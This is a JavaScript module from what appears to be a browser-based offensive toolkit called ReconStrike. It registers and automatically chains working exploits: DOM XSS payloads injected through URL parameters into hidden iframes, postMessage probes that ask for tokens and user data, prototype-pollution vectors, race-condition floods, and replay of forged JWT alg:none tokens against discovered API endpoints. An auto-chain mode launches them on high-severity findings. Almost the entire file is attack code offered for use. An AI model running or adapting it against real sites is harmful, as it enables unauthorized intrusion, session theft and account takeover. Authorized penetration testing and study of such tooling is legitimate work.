// language: JavaScript, file: 5_chain.js, target: modern browsers
// ReconStrike V13.1 -- Layer 5 Chain (repaired)

(function () {
  'use strict';
  if (!window.ReconCore) return;
  var core = window.ReconCore;
  var eventBus = core.eventBus;
  var storage = core.storage;
  var scope = core.scope;
  var mods = core.modules = core.modules || {};

  // ══════════════════════════════════════════════════════════════
  // EXPLOIT REGISTRY
  // Each expl: { id, match(finding), run(ctx) -> { success, evidence } }
  // ══════════════════════════════════════════════════════════════
  var EXPLOITS = [];

  // ───────────────────────────────────────────────────────────────
  // E1 -- DOM XSS Auto-Exploiter
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'xss-dom',
    match: function (f) {
      var t = (f.sinkType || '') + ' ' + (f.name || '') + ' ' + (f.issue || '');
      return /dom xss|innerHTML|insertAdjacent|dangerouslySet/i.test(t);
    },
    run: async function (ctx) {
      var canary = 'rs13_' + Math.random().toString(36).slice(2, 10);
      var payloads = [
        '<img src=x onerror="window.' + canary + '=1">',
        '"><img src=x onerror="window.' + canary + '=1">',
        '<svg onload="window.' + canary + '=1">',
        '\'><svg onload="window.' + canary + '=1">'
      ];
      var params = ctx.params || [];
      var endpoint = ctx.endpoint || location.href;
      var hits = [];

      if (!params.length) {
        return { success: false, reason: 'no parameters to test' };
      }

      for (var pi = 0; pi < params.length; pi++) {
        for (var li = 0; li < payloads.length; li++) {
          try {
            var u = new URL(endpoint, location.href);
            u.searchParams.set(params[pi], payloads[li]);

            var iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;border:0';
            iframe.sandbox = 'allow-scripts allow-same-origin';
            document.body.appendChild(iframe);

            await new Promise(function (res) {
              var done = false;
              var finish = function () { if (!done) { done = true; setTimeout(res, 250); } };
              iframe.onload = finish;
              iframe.src = u.href;
              setTimeout(finish, 1500);
            });

            try {
              var w = iframe.contentWindow;
              if (w && w[canary]) {
                hits.push({ param: params[pi], payload: payloads[li], url: u.href, evidence: 'canary fired in iframe' });
              }
            } catch (e) {}

            if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
          } catch (e) {}
        }
      }

      return {
        success: hits.length > 0,
        evidence: hits,
        payloadsTried: payloads.length * params.length
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E2 -- CORS Exfiltration (DISABLED)
  // The Origin request header is a forbidden header name per Fetch spec.
  // From the target's own page, the browser will always send the real
  // origin -- the fake one is silently stripped. This exploit cannot
  // produce a meaningful signal from here. A real CORS test must run
  // from an external origin (paste the built HTML PoC elsewhere).
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'cors-exfil',
    match: function () { return false; },
    run: async function () {
      return {
        success: false,
        reason: 'Origin header is forbidden from JS. Test CORS by opening the PoC HTML from a different origin.'
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E3 -- postMessage Hijack Verifier
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'postmessage-hijack',
    match: function (f) {
      var t = (f.name || '') + ' ' + (f.issue || '');
      return /postmessage/i.test(t);
    },
    run: async function (ctx) {
      var targetOrigin = ctx.targetOrigin || location.origin;
      var payloads = [
        { action: 'getToken' },
        { action: 'getUser' },
        { type: 'auth-status' },
        { url: 'javascript:void(0)' }
      ];
      var interactions = [];
      var listener = function (ev) {
        try {
          interactions.push({
            origin: ev.origin,
            data: (typeof ev.data === 'object') ? ev.data : String(ev.data).slice(0, 500),
            t: Date.now()
          });
        } catch (e) {}
      };
      window.addEventListener('message', listener);

      var w;
      try { w = window.open(targetOrigin, '_blank', 'width=1,height=1'); }
      catch (e) {
        window.removeEventListener('message', listener);
        return { success: false, reason: 'popup blocked' };
      }
      if (!w) {
        window.removeEventListener('message', listener);
        return { success: false, reason: 'popup blocked by browser' };
      }

      for (var i = 0; i < payloads.length; i++) {
        try { w.postMessage(payloads[i], '*'); } catch (e) {}
        await new Promise(function (r) { setTimeout(r, 400); });
      }
      await new Promise(function (r) { setTimeout(r, 1500); });
      window.removeEventListener('message', listener);
      try { w.close(); } catch (e) {}

      var leaked = interactions.filter(function (i) {
        try { return /token|user|auth|email|session/i.test(JSON.stringify(i.data)); }
        catch (e) { return false; }
      });

      return {
        success: interactions.length > 0,
        leaks: leaked.length > 0,
        evidence: interactions,
        leaked: leaked
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E4 -- Prototype Pollution → Gadget Chain
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'pp-gadget',
    match: function (f) {
      var t = (f.name || '') + ' ' + (f.issue || '');
      return /prototype pollution|proto|clobber/i.test(t);
    },
    run: async function (ctx) {
      var canary = 'ppCanary_' + Math.random().toString(36).slice(2, 8);
      var vectors = [
        canary + '=1',
        '__proto__[' + canary + ']=1',
        'constructor[prototype][' + canary + ']=1'
      ];
      var results = [];
      var endpoint = ctx.endpoint || location.href;

      for (var i = 0; i < vectors.length; i++) {
        try {
          var u = new URL(endpoint, location.href);
          var sep = u.search ? '&' : '';
          var full = u.href + sep + vectors[i];

          var iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;border:0';
          document.body.appendChild(iframe);

          await new Promise(function (res) {
            var done = false;
            var finish = function () { if (!done) { done = true; setTimeout(res, 300); } };
            iframe.onload = finish;
            iframe.src = full;
            setTimeout(finish, 1500);
          });

          var polluted = false;
          try {
            polluted = !!(iframe.contentWindow && iframe.contentWindow.Object.prototype[canary]);
          } catch (e) {}

          results.push({ vector: vectors[i], url: full, polluted: polluted });
          if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
          if (polluted) break;
        } catch (e) {}
      }

      var confirmed = results.some(function (r) { return r.polluted; });
      var gadgets = [];
      if (confirmed && mods.protoChain && typeof mods.protoChain.map === 'function') {
        try { gadgets = mods.protoChain.map(); } catch (e) {}
      }

      return {
        success: confirmed,
        evidence: results,
        gadgets: gadgets,
        nextStep: confirmed ? 'Feed gadget payload through the same vector to escalate' : null
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E5 -- Race Condition Exploiter
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'race-exploit',
    match: function (f) {
      var t = (f.name || '') + ' ' + (f.issue || '');
      return /race|toctou|double|concurrent/i.test(t);
    },
    run: async function (ctx) {
      if (!mods.race || typeof mods.race.sendConcurrent !== 'function') {
        return { success: false, reason: 'race module not loaded' };
      }
      var url = ctx.url || ctx.endpoint;
      if (!url) return { success: false, reason: 'no url' };
      var d = await mods.race.sendConcurrent({
        url: url,
        method: ctx.method || 'POST',
        body: ctx.body || '',
        headers: ctx.headers || {},
        n: ctx.n || 20
      });
      return {
        success: d.successes > 1,
        evidence: d,
        verdict: d.verdict
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E6 -- JWT alg:none Forger (uses stored endpoints, not hardcoded list)
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'jwt-none',
    match: function (f) {
      var t = (f.name || '') + ' ' + (f.issue || '');
      return /jwt|alg none/i.test(t);
    },
    run: async function (ctx) {
      var allJwt;
      try { allJwt = await storage.getAll('jwt'); }
      catch (e) { allJwt = []; }
      if (!allJwt || !allJwt.length) {
        return { success: false, reason: 'no JWT captured' };
      }
      var target = null;
      for (var i = 0; i < allJwt.length; i++) {
        if (allJwt[i] && allJwt[i].forgedNone) { target = allJwt[i]; break; }
      }
      if (!target) {
        return { success: false, reason: 'no forged token available' };
      }

      var endpoints = ctx.endpoints;
      if (!endpoints || !endpoints.length) {
        var storedEps;
        try { storedEps = await storage.getAll('endpoints'); }
        catch (e) { storedEps = []; }
        endpoints = storedEps
          .filter(function (e) { return e.confidence === 'FIRM' || e.confidence === 'CONFIRMED'; })
          .filter(function (e) { return /api|user|me|profile|auth|account/i.test(e.url || ''); })
          .map(function (e) { return e.url; })
          .slice(0, 5);
      }

      if (!endpoints.length) {
        return { success: false, reason: 'no candidate endpoints discovered yet' };
      }

      var proofs = [];
      for (var j = 0; j < endpoints.length; j++) {
        try {
          var r = await fetch(endpoints[j], {
            method: 'GET',
            headers: { Authorization: 'Bearer ' + target.forgedNone },
            credentials: 'include'
          });
          var body = await r.text();
          proofs.push({
            endpoint: endpoints[j],
            status: r.status,
            len: body.length,
            snippet: body.slice(0, 300)
          });
        } catch (e) {
          proofs.push({ endpoint: endpoints[j], error: e.message });
        }
      }

      var success = proofs.some(function (p) { return p.status === 200; });
      return { success: success, evidence: proofs, forged: target.forgedNone };
    }
  });

  // ══════════════════════════════════════════════════════════════
  // CHAIN ORCHESTRATOR
  // ══════════════════════════════════════════════════════════════
  mods.chain = (function () {
    var running = false;
    var history = [];

    function pickExploits(finding) {
      return EXPLOITS.filter(function (e) {
        try { return e.match(finding); }
        catch (err) { return false; }
      });
    }

    async function run(finding, ctx) {
      ctx = ctx || {};
      if (running) return { ok: false, reason: 'chain already running' };
      running = true;

      try {
        var matches = pickExploits(finding);
        var chainResult = {
          finding: finding,
          attempts: [],
          success: false,
          evidence: null,
          matches: matches.map(function (m) { return m.id; })
        };

        var merged = Object.assign({}, finding, ctx);

        for (var i = 0; i < matches.length; i++) {
          var e = matches[i];
          eventBus.emit('chain:attempt', { exploit: e.id, finding: finding });
          var r;
          try {
            r = await e.run(merged);
          } catch (err) {
            r = { success: false, error: err.message || String(err) };
          }
          chainResult.attempts.push({ exploit: e.id, result: r });

          if (r && r.success) {
            chainResult.success = true;
            chainResult.evidence = r.evidence;
            eventBus.emit('chain:success', {
              exploit: e.id,
              finding: finding,
              evidence: r.evidence
            });
            try {
              await storage.put('meta', {
                kind: 'chain-success',
                exploit: e.id,
                finding: finding,
                evidence: r.evidence
              }, 'chain-ok::' + e.id + '::' + Date.now());
            } catch (err2) {}
            if (ctx.stopOnFirst !== false) break;
          }
        }

        if (!chainResult.success && matches.length === 0) {
          chainResult.reason = 'no matching exploits';
        }

        history.push(Object.assign({ t: Date.now() }, chainResult));
        return chainResult;
      } finally {
        running = false;
      }
    }

    async function runAll(filter) {
      filter = filter || {};
      var kinds = ['endpoints', 'secrets', 'cors', 'jwt', 'forms', 'cookies', 'sri', 'network'];
      var findings = [];
      for (var k = 0; k < kinds.length; k++) {
        var all;
        try { all = await storage.getAll(kinds[k]); }
        catch (e) { all = []; }
        for (var j = 0; j < all.length; j++) {
          findings.push(Object.assign({}, all[j], { __kind: kinds[k] }));
        }
      }

      var RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
      var results = [];

      for (var i = 0; i < findings.length; i++) {
        var f = findings[i];
        if (filter.minSeverity && mods.cvss) {
          var sev;
          try { sev = mods.cvss.autoScore(f).severity; }
          catch (e) { sev = 'NONE'; }
          if (RANK[sev] < RANK[filter.minSeverity]) continue;
        }
        var r = await run(f, filter);
        results.push(r);
        if (r.success) {
          var hit = null;
          for (var h = 0; h < r.attempts.length; h++) {
            if (r.attempts[h].result && r.attempts[h].result.success) {
              hit = r.attempts[h].exploit;
              break;
            }
          }
          eventBus.emit('finding:new', Object.assign({}, f, {
            name: 'EXPLOITED: ' + (f.name || f.__kind),
            issue: 'Chain success via ' + (hit || 'unknown')
          }));
        }
      }

      var summary = {
        total: findings.length,
        attempted: results.length,
        succeeded: results.filter(function (r) { return r.success; }).length,
        byExploit: {}
      };
      results.forEach(function (r) {
        var hitEx = null;
        for (var h = 0; h < r.attempts.length; h++) {
          if (r.attempts[h].result && r.attempts[h].result.success) {
            hitEx = r.attempts[h].exploit;
            break;
          }
        }
        if (hitEx) summary.byExploit[hitEx] = (summary.byExploit[hitEx] || 0) + 1;
      });

      try {
        await storage.put('meta', {
          kind: 'chain-run-summary',
          summary: summary
        }, 'chain-summary::' + Date.now());
      } catch (e) {}

      return { summary: summary, results: results };
    }

    return {
      run: run,
      runAll: runAll,
      history: function () { return history.slice(); },
      exploits: function () { return EXPLOITS.map(function (e) { return e.id; }); },
      status: function () { return { running: running, count: history.length }; }
    };
  })();

  // ══════════════════════════════════════════════════════════════
  // AUTO-CHAIN -- listens for high-severity findings
  // ══════════════════════════════════════════════════════════════
  mods.autoChain = (function () {
    var enabled = false;
    var RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
    var minSeverity = 'HIGH';

    function onFinding(finding) {
      if (!enabled) return;
      var sev;
      try { sev = mods.cvss.autoScore(finding).severity; }
      catch (e) { return; }
      if (RANK[sev] < RANK[minSeverity]) return;
      setTimeout(function () {
        mods.chain.run(finding).catch(function () {});
      }, 500);
    }

    function start(opts) {
      opts = opts || {};
      if (enabled) return { already: true };
      enabled = true;
      minSeverity = opts.minSeverity || minSeverity;
      eventBus.on('finding:new', onFinding);
      return { ok: true, minSeverity: minSeverity };
    }

    function stop() {
      enabled = false;
    }

    return { start: start, stop: stop, enabled: function () { return enabled; } };
  })();

  // ══════════════════════════════════════════════════════════════
  // PUBLIC SURFACE
  // ══════════════════════════════════════════════════════════════
  core.exploit = {
    run: function (f, ctx) { return mods.chain.run(f, ctx); },
    runAll: function (filter) { return mods.chain.runAll(filter); },
    history: function () { return mods.chain.history(); },
    exploits: function () { return mods.chain.exploits(); },
    auto: function (opts) { return mods.autoChain.start(opts); },
    autoOff: function () { return mods.autoChain.stop(); },
    status: function () {
      return { chain: mods.chain.status(), auto: mods.autoChain.enabled() };
    }
  };

  eventBus.emit('chain:ready', {
    exploits: EXPLOITS.map(function (e) { return e.id; })
  });

  if (typeof completion === 'function') completion(true);
})();